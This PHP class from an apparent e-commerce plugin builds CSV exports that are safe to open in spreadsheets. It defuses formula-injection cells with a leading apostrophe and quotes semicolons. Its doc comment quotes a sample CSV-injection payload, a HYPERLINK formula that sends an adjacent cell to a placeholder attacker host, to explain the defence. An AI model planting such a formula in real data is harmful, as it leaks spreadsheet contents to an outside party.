<?php
/**
 * CSV that is safe to open in a spreadsheet.
 *
 * @package   SugarCommerce\Format
 * @copyright Copyright (c) 2026, ArrayPress Limited
 * @license   GPL-2.0-or-later
 * @since     1.1.0
 */

declare( strict_types=1 );

namespace SugarCommerce\Format;

/**
 * Class Csv
 *
 * An export is opened in Excel, Numbers or Sheets, not parsed by a program —
 * and all three run a cell that starts with `=` as a formula. A customer
 * whose name is `=HYPERLINK("https://evil.test?"&A1,"Click")` becomes a link
 * that posts the row beside it somewhere else when the seller clicks it.
 * OWASP calls it CSV injection; the defence is a leading apostrophe on any
 * cell that starts with a character a spreadsheet treats as the start of a
 * formula, which every one of them displays as nothing.
 *
 * Also written with a byte-order mark, because Excel otherwise reads UTF-8
 * as Windows-1252 and `Café` arrives as `CafÃ©`.
 *
 * @since 1.1.0
 */
final class Csv {

	/**
	 * Characters that make a spreadsheet read a cell as a formula.
	 *
	 * Tab and carriage return too: some importers strip leading whitespace
	 * and then see the `=` behind it.
	 *
	 * @var list<string>
	 */
	private const array TRIGGERS = array( '=', '+', '-', '@', "\t", "\r" );

	/**
	 * Whitespace an importer may strip before it looks for a formula; what
	 * follows it is checked too.
	 */
	private const string LEADING = " \t\r\n";

	/**
	 * Characters that put a cell in quotes.
	 *
	 * What fputcsv() quotes for — the comma, the quote, line breaks, tab and
	 * space — and the semicolon besides, because Excel in much of Europe
	 * splits a .csv on semicolons. Unquoted, `Jo;=HYPERLINK(…)` is one cell
	 * here and two there, and the second starts with `=`.
	 */
	private const string QUOTED = '/[,";\r\n\t ]/';

	/**
	 * A whole file: header row, then the rows.
	 *
	 * @since 1.1.0
	 *
	 * @param string[]                               $headers Column names.
	 * @param iterable<array<array-key, scalar|null>> $rows    Rows, each in
	 *                                                         header order.
	 * @param bool                                    $bom     Start with a
	 *                                                         UTF-8 byte-order
	 *                                                         mark, for Excel.
	 *
	 * @return string
	 */
	public static function build( array $headers, iterable $rows, bool $bom = true ): string {
		$csv = self::row( $headers );

		foreach ( $rows as $row ) {
			$csv .= self::row( $row );
		}

		return ( $bom ? "\xEF\xBB\xBF" : '' ) . $csv;
	}

	/**
	 * One value, made safe to open.
	 *
	 * Numbers are left alone — a negative amount is a number, not a formula,
	 * and prefixing it would make it text that no longer sums.
	 *
	 * @since 1.1.0
	 *
	 * @param scalar|\Stringable|null $value Value. Anything else is an empty cell.
	 *
	 * @return string
	 */
	public static function cell( mixed $value ): string {
		if ( is_int( $value ) || is_float( $value ) ) {
			return (string) $value;
		}

		if ( is_bool( $value ) ) {
			return $value ? 'yes' : 'no';
		}

		$text = is_string( $value ) || $value instanceof \Stringable ? (string) $value : '';

		if ( '' === $text ) {
			return '';
		}

		// The first character, and the first an importer that strips leading
		// whitespace would see.
		$first  = ltrim( $text, self::LEADING );
		$defuse = in_array( $text[0], self::TRIGGERS, true ) || ( '' !== $first && in_array( $first[0], self::TRIGGERS, true ) );

		return $defuse ? "'" . $text : $text;
	}

	/**
	 * One line of the file: each value made safe, quoted where it has to be,
	 * comma-separated, ending in a newline.
	 *
	 * Quotes the way fputcsv() does with no escape character — a quote
	 * inside is doubled — and for one more character; see QUOTED.
	 *
	 * @param array<array-key, scalar|null> $values Values, in column order.
	 *
	 * @return string
	 */
	private static function row( array $values ): string {
		$cells = array();

		foreach ( $values as $value ) {
			$cell    = self::cell( $value );
			$cells[] = 1 === preg_match( self::QUOTED, $cell ) ? '"' . str_replace( '"', '""', $cell ) . '"' : $cell;
		}

		return implode( ',', $cells ) . "\n";
	}
}
